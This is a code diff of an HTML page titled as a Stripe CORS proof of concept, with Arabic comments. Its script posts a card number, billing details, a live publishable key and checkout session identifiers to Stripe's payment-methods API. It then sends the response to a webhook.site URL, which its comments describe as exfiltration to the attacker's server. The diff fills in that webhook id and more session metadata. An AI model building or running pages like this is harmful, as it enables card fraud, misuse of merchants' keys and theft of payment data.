@@ -2,14 +2,14 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Stripe PoC</title>
+    <title>Stripe CORS PoC - Full Payload</title>
 </head>
 <body>
+    <h2>Exploit Running... Please wait.</h2>
     <script>
-        // الـ Endpoint المستهدف
         const targetUrl = "https://api.stripe.com/v1/payment_methods";
 
-        // تجميع الـ Body بالكامل مع البارامترز المطلوبة
+        // تجميع الـ Body بالكامل بالشكل الصحيح
         const postData = new URLSearchParams({
             "type": "card",
             "card[number]": "4539382852159718",
@@ -21,8 +21,14 @@
             "billing_details[address][line1]": "253 Mayer Courts",
             "billing_details[address][city]": "hamed",
             "billing_details[address][postal_code]": "86252-6922",
-            "key": "pk_live_51MPWO0AWilt2EAVVfWfPTQhgmLA0EeacLSzAs6e3vECCcMBvwcMse81XgX06klbdBHbPBdp0mrXE8P1gBrxE7yhH00RPHQ8SyG"
-            // وباقي الـ parameters لو حابب تضيفها هنا
+            "key": "pk_live_51MPWO0AWilt2EAVVfWfPTQhgmLA0EeacLSzAs6e3vECCcMBvwcMse81XgX06klbdBHbPBdp0mrXE8P1gBrxE7yhH00RPHQ8SyG",
+            "payment_user_agent": "stripe.js/572ee5cc22; 3B+stripe-js-v3;2F572ee5cc22;3B+checkout",
+            "client_attribution_metadata[client_session_id]": "34bf4c1a-793d-440d-b0a6-ea4046a31af9",
+            "client_attribution_metadata[checkout_session_id]": "cs_live_b1G2romlUWHesKK0nru1MfhNa6jWlnbUtkayMILqTCUHYOstepFoawhra",
+            "client_attribution_metadata[merchant_integration_source]": "checkout",
+            "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
+            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
+            "client_attribution_metadata[checkout_config_id]": "97800b53-a28c-4cbd-a23f-2322125aff27"
         });
 
         fetch(targetUrl, {
@@ -35,10 +41,16 @@
         })
         .then(response => response.json())
         .then(data => {
-            // سحب الداتا وإرسالها لسيرفر التحكم الخاص بك (Exfiltration)
-            fetch("https://webhook.site/your-unique-id-here?data=" + encodeURIComponent(JSON.stringify(data)));
+            // استبدل الـ URL ده برابط الـ Webhook الخاص بك لتلقي الداتا عليه
+            const exfiltrationUrl = "https://webhook.site/d80e6a3b-5db7-401f-a4a9-04facede08b0?data=" + encodeURIComponent(JSON.stringify(data));
+            
+            fetch(exfiltrationUrl, {
+                method: "GET"
+            });
         })
-        .catch(error => console.error("Error:", error));
+        .catch(error => {
+            console.error("Exploit Error:", error);
+        });
     </script>
 </body>
 </html>
